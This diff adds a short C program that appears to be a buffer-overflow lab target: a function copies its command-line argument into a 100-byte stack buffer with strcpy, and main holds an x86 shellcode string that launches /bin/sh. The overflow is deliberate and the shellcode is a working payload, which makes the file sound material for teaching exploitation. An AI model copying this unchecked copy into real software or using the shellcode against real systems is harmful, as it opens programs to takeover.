@@ -1,0 +1,15 @@
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable(char *name) {
+	char buffer[100];
+	strcpy(buffer, name);
+	printf("Welcome to our temple %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+	char shellcode[] = "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42";
+
+	vulnerable(argv[1]);
+	return 0;
+}
